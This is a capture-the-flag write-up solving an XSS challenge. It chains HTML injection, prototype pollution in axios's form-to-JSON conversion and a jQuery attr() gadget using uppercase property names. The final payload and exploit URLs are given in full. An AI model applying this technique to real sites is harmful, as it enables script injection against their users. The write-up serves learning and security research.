Mizu put another great xss challenge at the start of this year, so I went all in to solve it this time finally :p

The source for this challenge was provided: https://challenge-0124.intigriti.io/static/source.zip

The routes are defined in \src\app.js

```js
app.get("/", (req, res) => {
    if (!req.query.name) {
        res.render("index");
	return;
    }
    res.render("search", {
        name: DOMPurify.sanitize(req.query.name, { SANITIZE_DOM: false }),
        search: req.query.search
    });
});

app.post("/search", (req, res) => {
    name = req.body.q;
    repo = {};

    for (let item of repos.items) {
        if (item.full_name && item.full_name.includes(name)) {
            repo = item
	    break;
        }
    }
    res.json(repo);
});
```

The two relevant onces are this.

For the first index root, it takes the value from the query parameters `name` and `search` which are passed to the render method. Sanitization is being done on name parameter via dompurify so no easy xss there.

Those parameters values are used in the search.ejs template

```js
<%- include("inc/header"); %>
<h2>Hey <%- name %>,<br>Which repo are you looking for?</h2>

<form id="search">
    <input name="q" value="<%= search %>">
</form>

<hr>

<img src="/static/img/loading.gif" class="loading" width="50px" hidden><br>
<img class="avatar" width="35%">
<p id="description"></p>
<iframe id="homepage" hidden></iframe>

<script src="/static/js/axios.min.js"></script>
<script src="/static/js/jquery-3.7.1.min.js"></script>
<script>
    function search(name) {
        $("img.loading").attr("hidden", false);

        axios.post("/search", $("#search").get(0), {
            "headers": { "Content-Type": "application/json" }
        }).then((d) => {
            $("img.loading").attr("hidden", true);
            const repo = d.data;
            if (!repo.owner) {
                alert("Not found!");
                return;
            };

            $("img.avatar").attr("src", repo.owner.avatar_url);
            $("#description").text(repo.description);
            if (repo.homepage && repo.homepage.startsWith("https://")) {
                $("#homepage").attr({
                    "src": repo.homepage,
                    "hidden": false
                });
            };
        });
    };

    window.onload = () => {
        const params = new URLSearchParams(location.search);
        if (params.get("search")) search();

        $("#search").submit((e) => {
            e.preventDefault();
            search();
        });
    };
</script>
</body>
</html>

```

The value from `name` parameter (sanitized using dompurify) is placed here:

```ejs
<h2>Hey <%- name %>,<br>Which repo are you looking for?</h2>
```

From ejs docs https://ejs.co/#docs
`<%-` Outputs the unescaped value into the template, so this is clearly a html injection bug (no xss due to use of dompurify)

```ejs
<input name="q" value="<%= search %>">
```
`search` parameter value is safe from html injection: `<%=` Outputs the value into the template (HTML escaped)

The same can be verified from this url: https://challenge-0124.intigriti.io/challenge?name=shirley%3Cimg%20src=x%3E&search=shirley%22%3E%3Cimg%20src=x%3E
![image](https://github.com/Sudistark/CTF-Writeups/assets/31372554/60261d43-9364-4fa4-9b4c-ca12f575b20d)


Moving on to the script block, it loads two things axios and jquery.The version of jquery is mentioned but axios isn't.

```js
    function search(name) {
        $("img.loading").attr("hidden", false);

        axios.post("/search", $("#search").get(0), {
            "headers": { "Content-Type": "application/json" }
        }).then((d) => {
            $("img.loading").attr("hidden", true);
            const repo = d.data;
            if (!repo.owner) {
                alert("Not found!");
                return;
            };

            $("img.avatar").attr("src", repo.owner.avatar_url);
            $("#description").text(repo.description);
            if (repo.homepage && repo.homepage.startsWith("https://")) {
                $("#homepage").attr({
                    "src": repo.homepage,
                    "hidden": false
                });
            };
        });
    };

    window.onload = () => {
        const params = new URLSearchParams(location.search);
        if (params.get("search")) search();

        $("#search").submit((e) => {
            e.preventDefault();
            search();
        });
    };
```

Upon window load, it calls the `search` method, `params` variable contains the value of *search* query parameter.


```js
        axios.post("/search", $("#search").get(0), {
            "headers": { "Content-Type": "application/json" }
        }).then((d) => {
            $("img.loading").attr("hidden", true);
            const repo = d.data;
            if (!repo.owner) {
                alert("Not found!");
                return;
            };

            $("img.avatar").attr("src", repo.owner.avatar_url);
            $("#description").text(repo.description);
            if (repo.homepage && repo.homepage.startsWith("https://")) {
                $("#homepage").attr({
                    "src": repo.homepage,
                    "hidden": false
                });
            };
        });
```

Axios is used to make a post request to the search endpoint, the 2nd arguement is `$("#search").get(0)` which for some reasons looks weird.
It stores the response from the search endpoint in `repo` variable, if `repo.owner` is defined it moves on the next part of code

```js
$("img.avatar").attr("src", repo.owner.avatar_url);

$("img.avatar")[0] corresponds to the <img class="avatar" width="35%"> element
It sets the src attribute value with what is in the `repo.owner.avatar_url` property
```

```js
$("#description").text(repo.description);

<p id="description"></p> // sets the innerText property to `repo.description`
```

```js
            if (repo.homepage && repo.homepage.startsWith("https://")) {
                $("#homepage").attr({
                    "src": repo.homepage,
                    "hidden": false
                });
            };
```

It checks the value of `repo.homepage` if it starts `https://` or not. If it does it sets the value to the src attribute of `$("#homepage")` element which basically is an iframe

```html
<iframe id="homepage" hidden=""></iframe>
```

This kinda looks promising sink  as if somehow that check can be bypassed (with the help of quirk of this challenge) it would be easy to get xss if it went something like this 

```html
<iframe id="homepage" hidden="" src="javascript:alert()"></iframe>
```


```js
app.post("/search", (req, res) => {
    name = req.body.q;
    repo = {};

    for (let item of repos.items) {
        if (item.full_name && item.full_name.includes(name)) {
            repo = item
	    break;
        }
    }
    res.json(repo);
});
```

It basically searchs for the string provided in q param (search parameter ) and checks if a match is found in repos.json file (check the source)

For eg this loads:
https://challenge-0124.intigriti.io/challenge?name=shirley%3Cimg%20src=x%3E&search=angular/material-start

```html
<iframe id="homepage" src="https://angularjs-material-start.web.app"></iframe>
```

-------------------------

# Axios Prototype Pollution

As I already said that the 2nd arg kinda look weird.Lets dig into it to see why it's used that way

```js
axios.post("/search", $("#search").get(0), {
            "headers": { "Content-Type": "application/json" }
        })
```

```js
>$("#search").get(0)

<form id="search">
    <input name="q" value="angular/material-start">
</form>
```

Ok so they are passing full the whole form tag as 2nd arg?

```
POST /search HTTP/1.1
Host: challenge-0124.intigriti.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Content-Type: application/json
Content-Length: 30

{"q":"angular/material-start"}
```

Cool, so it somehow converted that form tag to  json format.
Looking at some examples of axios post calls

https://github.com/axios/axios/blob/6d4c421ee157d93b47f3f9082a7044b1da221461/test/module/typings/cjs/index.ts#L91

```js
axios.post('/user', { foo: 'bar' })
    .then(handleResponse)
    .catch(handleError);
```

See the 2nd arg is actually in json format.
So a form tag was converted into  a json object, such conversions to json objects are often vulnerable to prototype pollution so I started searching on google for "axios prototype pollution"

The first seacrh result:

https://security.snyk.io/vuln/SNYK-JS-AXIOS-6144788

Commit: https://github.com/axios/axios/commit/3c0c11cade045c4412c242b5727308cff9897a0e

Indeed this is a fix for the pp bug, before there was no check for the key if it was equal to `__proto__`:

```js
function formDataToJSON(formData) {
  function buildPath(path, value, target, index) {
    let name = path[index++];

    if (name === '__proto__') return true;
```
One more file was changed in that commit which is used to check for regressions:

```js
  it('should resist prototype pollution CVE', () => {
    const formData = new FormData();

    formData.append('foo[0]', '1');
    formData.append('foo[1]', '2');
    formData.append('__proto__.x', 'hack');
    formData.append('constructor.prototype.y', 'value');

    expect(formDataToJSON(formData)).toEqual({
      foo: ['1', '2'],
      constructor: {
        prototype: {
          y: 'value'
        }
      }
    });

    expect({}.x).toEqual(undefined);
    expect({}.y).toEqual(undefined);
  });
});
```

This gives us an idea about how the payload will look like to trigger the prototype pollution bug:

Sample prototype pollution payload:

```js
<form id="search">
    <input name="q" value="angular/material-start">
    <input name="__proto__.x" value="hack"/>
</form>
```



Our html injection is before the form tag, so we can supply the above prototype pollution payload

```html
<h2>Hey <%- name %>,<br>Which repo are you looking for?</h2>

<form id="search">
    <input name="q" value="<%= search %>">
</form>
```
https://challenge-0124.intigriti.io/challenge?name=shirley%3Cform%20id=%22search%22%3E%20%3Cinput%20name=%22q%22%20value=%22angular/material-start%22%3E%20%3Cinput%20name=%22__proto__.x%22%20value=%22hack%22/%3E%20%3C/form%3E&search=angular/material-start

It will render like this

```html
<h2>Hey shirley<form id="search"> <input value="angular/material-start" name="q"> <input value="hack" name="__proto__.x"> </form>,<br>Which repo are you looking for?</h2>

<form id="search">
    <input name="q" value="angular/material-start">
</form>
```

See now there are two form tags with same id `search`, one is the original  and the other which we injected contains the pp payload
As our injected form tag is first it will be used by axios instead


```js
axios.post("/search", $("#search").get(0), {
            "headers": { "Content-Type": "application/json" }
        })
```

Here we go , we successfully polluted the `x` property.

![image](https://github.com/Sudistark/CTF-Writeups/assets/31372554/a8608493-c73b-428b-91a9-f4d7828c07b8)

--------

# Prototype Pollution Gadget

As I had no idea about how to get xss for now, I though why not try looking for a pp gadget in axios or jquery.As that can give easy xss.
Here you can find a bunch of gadgets for jquery: https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/jquery.md#xoff-jquery-all-versions

For axios I didn't find anything from google search and the jquery ones didn't seemed related to the challenge.

So the only possible way was to look for a new jquery gadget :)



To make the process easiere I was using a local version which had the jquery unminified version
```html
<script/src=https://code.jquery.com/jquery-3.7.1.js></script>
<script>
  
  Object.prototype.test="<img src=x onerror=alert()>"

</script>

<iframe id="homepage"></iframe>
<img class="avatar" width="35%" src="https://avatars.githubusercontent.com/u/52466165?v=4"/>
<p id="description">A tool to calculate the contrast ratio between any two valid CSS colors.</p>


<script>
$("#description").text("hello");
       $("#homepage").attr({
                    "src": "",
                    "hidden": false
                });
</script>


```

One thing was starnge after using a pp payload, this error appeared in the console:

```js
Uncaught TypeError: Cannot use 'in' operator to search for 'set' in <img src=x onerror=alert()>
    at attr (jquery-3.7.1.js:7910:24)
    at access (jquery-3.7.1.js:3919:5)
    at access (jquery-3.7.1.js:3890:4)
    at jQuery.fn.init.attr (jquery-3.7.1.js:7872:10)
    at tset2.htm:15:23
```


The statement `"set" in hooks` was triggering this error, as set property is there only in case of objects but turns out hooks was containing a string.



```js
			if ( hooks && "set" in hooks &&
				( ret = hooks.set( elem, value, name ) ) !== undefined ) {
				return ret;
			}
```

Tracing it back from where hooks came from

```js
        if ( nType !== 1 || !jQuery.isXMLDoc( elem ) ) {
            hooks = jQuery.attrHooks[ name.toLowerCase() ] ||
                ( jQuery.expr.match.bool.test( name ) ? boolHook : undefined );
        }
```

somehow `name` contains the polluted property for eg in this case `test`

```js
Object.prototype.test="<img src=x onerror=alert()>"
```

Normally it would return undefined but due to the prototype pollution

```js
jQuery.attrHooks[ name.toLowerCase() ]
jQuery.attrHooks[ "test".toLowercase() ] was returning a string "<img src=x onerror=alert()>"
```

Tracing more backwards to see where name is coming from

```js
jQuery.extend( {
    attr: function( elem, name, value ) {
```
name -> test
value -> <img src=x onerror=alert()>

Tracing from where this function was called:

```js
if ( fn ) {
			for ( ; i < len; i++ ) {
				fn(
					elems[ i ], key, raw ?
						value :
						value.call( elems[ i ], i, fn( elems[ i ], key ) )
				);
			}
		}
```

```js
		for ( i in key ) {
			access( elems, fn, i, key[ i ], true, emptyGet, raw );
		}
```

![image](https://github.com/Sudistark/CTF-Writeups/assets/31372554/3bd3aa7a-f77a-4062-96a5-796f64db3b98)

elems contains a reference to the iframe element and key contains the json object which passed in as argument to the attr method

```js
$("#homepage").attr({
                    "src": "https://google.com",
                    "hidden": false
});
```

so key was equal to 

```js
{
 "src": "https://google.com",
 "hidden": false
}
```

Thanks to the prototype pollution bug, even though only two attributes were provided (src,hidden)

```js
		for ( i in key ) {
			console.log(i);
		}
```

![image](https://github.com/Sudistark/CTF-Writeups/assets/31372554/b0479b85-9ef0-45be-90da-27d131b993d1)

See `test` came from the `__proto__`

If I can somehow fix that "set" in error , I would be able to get a very simple xss as

```js
            if ( hooks && "set" in hooks && // error trigger here
                ( ret = hooks.set( elem, value, name ) ) !== undefined ) {
                return ret;
            }

            elem.setAttribute( name, value + "" ); // here is the sink
            return value;
```

For other attributes `hooks` is undefined so it skips the if statement and directly reaches the sink which sets the attribute to the elem (refrencing to the iframe tag)


By polluting some properties like this, it can give you xss (if you can somehow skip the hooks if condition check)

```js
Object.prototype.srcdoc="<img src=x onerror=alert()>"
Object.prototype.onload="alert()"
```

This is where it took me much time to figure out the solution https://gist.github.com/Sudistark/d869e505c8ff45c3bb96612bcb2c953b even tried asking Mizu if I was on the right path or not

He told me yeah it should work as this is the unintended solution which everyone was using :p,as I knew there must be something I am still missing I looked at it again and again to fix it but still had no success.
I was looking for a way to make hooks undefined,which didn't looked possible as the polluted property will be available to all the objects.

Next day when I again looked at it, I noticed that:

```js
jQuery.attrHooks[ name.toLowerCase() ]
```

They were transforming the polluted property to lowercase before using it, so if for eg pollute a propert `SRCDOC`

```js
Object.prototype.SRCDOC=1337

jQuery.attrHooks["srcdoc"] // undefined as only the SRCDOC exists not srcdoc in the prototype chain
```

Due to the lowercase transformation it was possible to make hooks undefined and reach the sink easily.


https://challenge-0124.intigriti.io/challenge?name=shirley%3Cform%20id=%22search%22%3E%20%3Cinput%20name=%22q%22%20value=%22angular/material-start%22%3E%20%3Cinput%20name=%22__proto__.ONLOAD%22%20value=%22alert()%22/%3E%20%3C/form%3E&search=angular/material-start


Final payload

```html
<form id="search"> 
<input name="q" value="angular/material-start"> 
<input name="__proto__.ONLOAD" value="alert()"/> 
</form>
```

![image](https://github.com/Sudistark/CTF-Writeups/assets/31372554/287124f6-67ef-47e9-b347-a095a98f2124)
